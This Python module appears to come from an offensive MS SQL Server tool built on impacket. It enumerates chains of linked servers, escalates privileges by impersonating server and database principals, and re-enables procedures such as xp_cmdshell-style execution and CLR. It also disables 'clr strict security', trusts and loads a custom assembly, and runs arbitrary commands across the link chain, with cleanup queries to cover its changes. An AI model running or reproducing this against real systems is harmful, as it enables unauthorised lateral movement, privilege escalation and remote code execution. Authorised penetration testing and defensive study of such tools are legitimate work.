########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.1'
__email__ = ['El3ct71k@gmail.com']

########################################################
import os
import copy
import utilities
from impacket import LOG
from typing import Callable
from playbooks import Queries
from typing import Literal, Any
from classes.base_sql_client import BaseSQLClient


class Operations(BaseSQLClient):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, args_options)
        self.high_privileged_server_roles = ['sysadmin']
        self.high_privileged_server_principals = ['sa']
        self.high_privileged_database_roles = ['db_owner']
        self.high_privileged_database_principals = ['dbo']

        self.use_state = not args_options.no_state
        self.username = user_name
        self.server_address = server_address
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{user_name}.state"

        self.rev2self = dict()
        self.max_recursive_links = args_options.max_recursive_links
        self.current_chain_id = 1
        self.chain_id = args_options.chain_id
        self.auto_yes = args_options.auto_yes
        self.custom_asm_directory = os.path.join('playbooks', 'custom-asm')

    def add_to_server_state(self, linked_server: str, key: str, value: Any, remove_duplicates: bool = True):
        """
            This function is responsible to add the server items to the server state.
        """
        if linked_server not in self.state['servers_info'].keys():
            self.state['servers_info'][linked_server] = {
                "hostname": "",
                "chain_str": linked_server,
                "chain_tree": list(),
                "db_user": "",
                "server_user": "",
                "link_name": "",
                "instance_name": "",
                "version": "",
                "domain_name": "",
                "chain_id": self.current_chain_id,
                "server_principals": list(),
                "database_principals": list(),
                "server_roles": list(),
                "database_roles": list(),
                "trustworthy_db_list": list(),
                "adsi_providers": list(),
                "server_principals_history": list(),
                "database_principals_history": list()

            }
            self.current_chain_id += 1

        if isinstance(self.state['servers_info'][linked_server][key], list):
            if not isinstance(value, list):
                value = [value]
            for v in value:
                if v in self.state['servers_info'][linked_server][key] and remove_duplicates:
                    continue
                self.state['servers_info'][linked_server][key].append(v)

        elif isinstance(self.state['servers_info'][linked_server][key], dict):
            for k, v in value.items():
                self.state['servers_info'][linked_server][key][k] = v
        else:
            self.state['servers_info'][linked_server][key] = value

    def filter_server_by_link_name(self, link_name: str) -> list:
        """
            This function is responsible to filter the server by link name.
        """
        link_information = utilities.filter_subdict_by_key(self.state['servers_info'], "link_name", link_name)
        if not link_information:
            return []
        link_information = link_information[0]
        hosts = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
        filtered_by_domain = utilities.filter_dict_by_key(hosts, "domain_name", link_information['domain_name'])
        return utilities.sort_dict_by_key(filtered_by_domain, "chain_id")

    def filter_server_by_chain_str(self, chain_str: str) -> list:
        """
            This function is responsible to filter the server by chain.
        """
        return utilities.filter_subdict_by_key(self.state['servers_info'], "chain_str", chain_str)

    def filter_server_by_chain_id(self, chain_id: int) -> list:
        """
            This function is responsible to filter the server by chain id.
        """
        return utilities.filter_subdict_by_key(self.state['servers_info'], "chain_id", chain_id)

    def sort_servers_by_chain_id(self) -> list:
        """
            This function is responsible to sort the servers by chain id.
        """
        return utilities.sort_dict_by_key(self.state['servers_info'].values(), "chain_id")

    def get_title(self, linked_server):
        """
            This function is responsible to get chain or linked server title.
        """
        if self.chain_id:
            filtered_servers = self.filter_server_by_chain_id(self.chain_id)
        else:
            filtered_servers = self.filter_server_by_link_name(linked_server)

        chain_str = filtered_servers[0]['chain_str']
        user_name = filtered_servers[0]['server_user']
        db_user = filtered_servers[0]['db_user']
        return f"{chain_str} (Server user: {user_name} | DB User: {db_user})"

    def is_valid_chain_id(self) -> bool:
        """
            This function is responsible to check if the given chain id is valid.
        """
        if self.chain_id:
            filtered_servers = self.filter_server_by_chain_id(self.chain_id)

            if not filtered_servers:
                LOG.error(f"Chain id {self.chain_id} is not in the chain ids list")
                return False
            chain_str = filtered_servers[0]['chain_str']
            LOG.info(f"Chosen chain: {chain_str} (ID: {self.chain_id})")
        return True

    def is_valid_link_server(self, linked_server: str) -> bool:
        """
            This function is responsible to check if the given linked server is valid.
        """

        filtered_servers = self.filter_server_by_link_name(linked_server)

        if not filtered_servers:
            LOG.error(f"{linked_server} is not in the linked servers list")
            return False
        LOG.info(f"Chosen linked server: {linked_server}")
        return True

    def is_link_in_state(self, link_server, state) -> bool:
        """
            This function is responsible to check if the given linked server is in the state.
        """
        new_server = self.filter_server_by_link_name(link_server)
        if not new_server:
            return True

        for captured_link in state:
            server_info = self.filter_server_by_link_name(captured_link)
            if not server_info:
                LOG.error(f"{captured_link} is not in the linked servers list")
                continue
            if server_info[0]['hostname'] == new_server[0]['hostname']:
                if server_info[0]['domain_name'] == new_server[0]['domain_name']:
                    return True
        return False

    def detect_architecture(self, linked_server: str, arch: Literal['autodetect', 'x64', 'x86']) -> str:
        """
            This function is responsible to detect the architecture of a remote server.
        """
        if arch != 'autodetect':
            LOG.info(f"Architecture is set to {arch}")
            return arch

        for server_info in self.filter_server_by_chain_str(linked_server):
            LOG.info(f"Find architecture in {server_info['chain_str']}")
            for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
                if x64_sig in server_info['version']:
                    LOG.info("Architecture is x64")
                    return "x64"
            for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
                if x86_sig in server_info['version']:
                    LOG.info("Architecture is x86")
                    return "x86"
        return ""

    def is_privileged_server_user(self, linked_server: str) -> bool:
        if self.state['servers_info'][linked_server]['server_user'] in self.high_privileged_server_roles:
            return True
        if utilities.is_string_in_lists(self.state['servers_info'][linked_server]['server_principals'],
                                        self.high_privileged_server_principals):
            return True
        return utilities.is_string_in_lists(self.state['servers_info'][linked_server]['server_roles'],
                                            self.high_privileged_server_roles)

    def is_privileged_db_user(self, linked_server: str) -> bool:
        if self.state['servers_info'][linked_server]['db_user'] in self.high_privileged_server_roles:
            return True
        if utilities.is_string_in_lists(self.state['servers_info'][linked_server]['database_principals'],
                                        self.high_privileged_database_principals):
            return True
        return utilities.is_string_in_lists(self.state['servers_info'][linked_server]['database_roles'],
                                            self.high_privileged_database_roles)

    def remove_server_information(self, linked_server: str):
        """
            This function is responsible to remove the server information.
        """
        if linked_server in self.state['servers_info'].keys():
            del self.state['servers_info'][linked_server]

    def retrieve_server_information(self, linked_server: str = None, linked_server_name: str = None) -> bool:
        """
            This function is responsible to retrieve the server information.
        """
        queries = {
            "server_information": Queries.SERVER_INFORMATION,
            "user_information": Queries.USER_INFORMATION,
            "trustworthy_db_list": Queries.TRUSTWORTHY_DB_LIST,
            "server_roles": Queries.GET_USER_SERVER_ROLES,
            "db_roles": Queries.GET_USER_DATABASE_ROLES,
            "server_principals": Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL,
            "db_principals": Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL
        }
        required_queries = ["server_information", "user_information"]
        dict_results = {}
        for key, query in queries.items():
            results = self.build_chain(query, linked_server)

            if not results['is_success']:
                if key in required_queries:
                    LOG.error(f"Failed to retrieve {key} from {linked_server}")
                    self.remove_server_information(linked_server)
                    return False
                continue
            dict_results[key] = results['results']

        db_user = dict_results['user_information'][0]['db_user']
        server_user = dict_results['user_information'][0]['server_user']

        hostname = utilities.remove_service_name(dict_results['server_information'][0]['hostname'])

        domain_name = dict_results['server_information'][0]['domain_name']
        server_version = dict_results['server_information'][0]['server_version']
        instance_name = dict_results['server_information'][0]['instance_name']

        if not linked_server:
            self.state['local_hostname'] = hostname
            LOG.info(f"Discovered hostname: {hostname}")
            linked_server = hostname
        linked_server_name = linked_server_name if linked_server_name else hostname
        self.add_to_server_state(linked_server, "hostname", hostname)
        self.add_to_server_state(linked_server, "link_name", linked_server_name)
        self.add_to_server_state(linked_server, "db_user", db_user)
        self.add_to_server_state(linked_server, "server_user", server_user)
        self.add_to_server_state(linked_server, "version", server_version)
        self.add_to_server_state(linked_server, "domain_name", domain_name)
        self.add_to_server_state(linked_server, "instance_name", instance_name)

        if 'trustworthy_db_list' in dict_results.keys():
            for db_name in dict_results['trustworthy_db_list']:
                self.add_to_server_state(linked_server, "trustworthy_db_list", db_name['name'])

        if 'server_roles' in dict_results.keys():
            for server_role in dict_results['server_roles']:
                self.add_to_server_state(linked_server, "server_roles", server_role['group'])

        if 'db_roles' in dict_results.keys():
            for db_role in dict_results['db_roles']:
                self.add_to_server_state(linked_server, "database_roles", db_role['group'])

        if 'server_principals' in dict_results.keys():
            for server_principal in dict_results['server_principals']:
                if server_principal['username'] == server_user:
                    continue
                if server_principal['permission_name'] != 'IMPERSONATE':
                    if not self.is_privileged_server_user(linked_server):
                        continue
                self.add_to_server_state(linked_server, "server_principals", server_principal['username'])

        if 'db_principals' in dict_results.keys():
            for db_principal in dict_results['db_principals']:
                if db_principal['username'] == db_user:
                    continue

                if db_principal['permission_name'] != 'IMPERSONATE':
                    if not self.is_privileged_db_user(linked_server):
                        continue
                self.add_to_server_state(linked_server, "database_principals", db_principal['username'])
        return True

    def retrieve_links(self, linked_server: str = None, old_state: list = None) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        if not linked_server:
            linked_server = self.state['local_hostname']
        state = copy.copy(old_state)
        state = state if state else [linked_server]
        rows = self.build_chain(Queries.GET_LINKABLE_SERVERS, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
            return

        if not rows['results']:
            LOG.info(f"No linkable servers found on {linked_server}")
            return

        for row in rows['results']:
            if not row['SRV_NAME']:
                continue

            linkable_server = utilities.remove_service_name(row['SRV_NAME'])
            if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject":
                self.add_to_server_state(linked_server, "adsi_providers", linkable_server)
                continue

            if "." not in linkable_server and linkable_server == state[-1].split(".")[0]:
                continue

            elif "." in linkable_server and "." in state[-1] and linkable_server == state[-1]:
                continue

            elif linkable_server in state[1:]:
                continue

            linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
            self.add_to_server_state(linkable_chain_str, "chain_tree", state + [linkable_server],
                                     remove_duplicates=False)
            self.add_to_server_state(linkable_chain_str, "link_name", linkable_server)
            if not self.retrieve_server_information(linkable_chain_str, linkable_server):
                continue

            if self.is_link_in_state(linkable_server, state):
                continue
            self.retrieve_links(linkable_chain_str, state + [linkable_server])

    def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(query, linked_server, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query}")
            return False

        if not results['results']:
            if self.can_impersonate(linked_server):
                if utilities.receive_answer("No results were returned. try to escalate privileges?", ['y', 'n'], 'y'):
                    return False
                else:
                    return True

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return True

    def can_impersonate(self, linked_server: str) -> bool:
        """
        This function is responsible to check if we can impersonate as other users.
        """
        if linked_server in self.state['servers_info'].keys():
            for db_principal in self.state['servers_info'][linked_server]['database_principals']:
                if db_principal not in self.state['servers_info'][linked_server]['database_principals_history']:
                    return True
        if linked_server in self.state['servers_info'].keys():
            if self.state['servers_info'][linked_server]['server_principals']:
                for server_principal in self.state['servers_info'][linked_server]['server_principals']:
                    if server_principal not in self.state['servers_info'][linked_server]['server_principals_history']:
                        return True
        return False

    def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
        """
        This function is responsible to enable a procedure on the server.
        """
        procedure_custom_name = utilities.retrieve_procedure_custom_name(procedure)
        is_procedure_enabled = self.build_chain(Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name),
                                                linked_server)

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_executable status")
            return False

        if is_procedure_enabled['results'] and is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
            LOG.warning(
                f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
            if not self.is_privileged_server_user(linked_server):
                is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
                if (not is_procedure_can_be_configured['is_success']) or \
                        is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                    LOG.error(f"Cant fetch sp_configure status")
                    return False

            LOG.info(f"{procedure} can be configured")
            query = ""
            status = 1 if required_status else 0
            rev2self_status = 0 if required_status else 1
            query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
            LOG.info(f"Reconfiguring {procedure}")
            self.add_rev2self_query(linked_server,
                                    Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))

            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.warning(f"Failed to enable {procedure}")
        return True

    def execute_procedure(self, procedure: str, command: str, linked_server: str, reconfigure: bool = False) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        is_procedure_accessible = self.build_chain(
            Queries.IS_PROCEDURE_ACCESSIBLE.format(procedure=procedure),
            linked_server)

        if (not is_procedure_accessible['is_success']) or \
                is_procedure_accessible['results'][0]['is_accessible'] != 'True':
            LOG.error(f"{procedure} is not accessible")
            return False

        if reconfigure:
            if not self.reconfigure_procedure("show advanced options", linked_server, required_status=True):
                return False

            if not self.reconfigure_procedure(procedure, linked_server, required_status=True):
                return False

        if procedure == 'sp_oacreate':
            procedure_query = Queries.SP_OAMETHOD.format(command=command)
        else:
            procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)

        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {linked_server}")
            if not reconfigure:
                return self.execute_procedure(procedure, command, linked_server, reconfigure=True)
            return False

        LOG.info(f"The {procedure} command executed successfully on {linked_server}")
        if not results['results']:
            LOG.warning("Failed to resolve the results")
            return results['is_success']

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, asm_file_location: str, linked_server: str, asm_name: str):
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False

        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        if not self.reconfigure_procedure('show advanced options', linked_server, required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure('clr enabled', linked_server, required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure('clr strict security', linked_server, required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False

        my_hash = utilities.calculate_sha512_hash(asm_file_location)
        is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash), linked_server)

        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(my_hash=my_hash), linked_server, method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.add_rev2self_query(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
        add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
                                          linked_server, method="exec_at")
        if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
            LOG.error(f"Failed to add custom assembly")
            return False
        return True

    def execute_custom_assembly_procedure(self, asm_file_location: str, procedure_name: str, command: str,
                                          asm_name: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, asm_name):
            return False

        add_procedure = self.build_chain(Queries.CREATE_PROCEDURE.format(asm_name=asm_name,
                                                                         procedure_name=procedure_name, arg='command'),
                                         linked_server, method="exec_at")

        if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
            LOG.error(f"Failed to create procedure")
            return False
        self.add_rev2self_query(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))

        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly_function(self, asm_file_location: str, function_name: str, class_name: str,
                                         namespace: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the function and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
            return False
        add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
            function_name=function_name, asm_name='FuncAsm', namespace=namespace,
            class_name=class_name, arg="@port int"),
            linked_server, method="exec_at")

        self.add_rev2self_query(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
        self.add_rev2self_query(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
        if (not add_function['is_success']) and 'already an object named' not in add_function['replay']:
            LOG.error(f"Failed to create procedure")
            return False
        function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)

        if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
            LOG.error(f"Failed to execute custom assembly")
            return False
        LOG.info(f"Successfully executed custom assembly")
        return True

    def impersonate_as(self, linked_server: str, principal_type: Literal['server', 'database']) -> bool:
        """
        This function is responsible to impersonate as a server or database principal.
        """
        self.execute_as = ""
        if linked_server not in self.state['servers_info'].keys():
            return False

        for user in self.state['servers_info'][linked_server][f'{principal_type}_principals']:
            if user in self.state['servers_info'][linked_server][f'{principal_type}_principals_history']:
                continue

            if not self.auto_yes:
                if utilities.receive_answer(f"Try to impersonate as {user} {principal_type} "
                                            f"principal on {linked_server}?",
                                            ["y", "n"], 'n'):
                    LOG.info(f"Skipping impersonation as {user} server principal on {linked_server}")
                    continue

            LOG.info(f"Trying to impersonate as {user} {principal_type} principal on {linked_server}")
            # Log the server principal in order to avoid infinite loop

            if principal_type == 'server':
                query = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
            else:
                query = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)

            self.add_to_server_state(linked_server, f'{principal_type}_principals_history', user)
            if self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.info(f"Successfully impersonated as {user} {principal_type} principal on {linked_server}")
                self.execute_as = query
                return True
        return False

    def add_rev2self_query(self, linked_server: str, query: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """
        if linked_server not in self.rev2self.keys():
            self.rev2self[linked_server] = []
        self.rev2self[linked_server].append(self.generate_query(query, linked_server, method="exec_at"))

    def procedure_runner(self, func: Callable, args: list, **kwargs) -> bool:
        """
        This function is responsible to attempt to run a procedure through local or link server.
        This function will try  to run the procedure through the following methods if no success:
        1. Execute the procedure locally.
        2. Impersonate as a server principal and execute the procedure.
        3. Impersonate as a database principal and execute the procedure.

        """
        self.execute_as = ""
        linked_server = kwargs['linked_server']
        if self.can_impersonate(linked_server):
            if self.auto_yes or utilities.receive_answer(f"The {linked_server} server can escalate privileges, "
                                                         f"do you want to continue with the current privileges?",
                                                         ['y', 'n'], 'y'):
                if func(*args, **kwargs):
                    return True
        else:
            if func(*args, **kwargs):
                return True

        while self.impersonate_as(linked_server, principal_type='server'):
            if func(*args, **kwargs):
                return True

        while self.impersonate_as(linked_server, principal_type='database'):
            if func(*args, **kwargs):
                return True

        return False

    def procedure_chain_builder(self, func: Callable, args: list, **kwargs) -> bool:
        """
        This function is responsible to build a procedure chain.
        """
        if 'linked_server' not in kwargs.keys():
            LOG.error("No linked server was provided")
            return False

        if kwargs['linked_server'] == self.state['local_hostname']:
            retval = self.procedure_runner(func, args, **kwargs)
            if retval:
                LOG.info(f"Successfully executed {func.__name__} on {kwargs['linked_server']}")
                return True

            LOG.error(f"{func.__name__} cannot be executed on {kwargs['linked_server']}")
            LOG.info("Trying to find a linkable server chain")

        if self.chain_id:
            filtered_servers = self.filter_server_by_chain_id(self.chain_id)
        else:
            filtered_servers = self.filter_server_by_chain_str(kwargs['linked_server'])

        for results in filtered_servers:
            LOG.info(f"Trying to execute {func.__name__} on {results['chain_str']}")
            kwargs['linked_server'] = results['chain_str']
            if self.procedure_runner(func, args, **kwargs):
                LOG.info(f"Successfully executed {func.__name__} on {results['chain_str']}")
                return True
            LOG.warning(f"Failed to execute {func.__name__} on {results['chain_str']}")

        return False
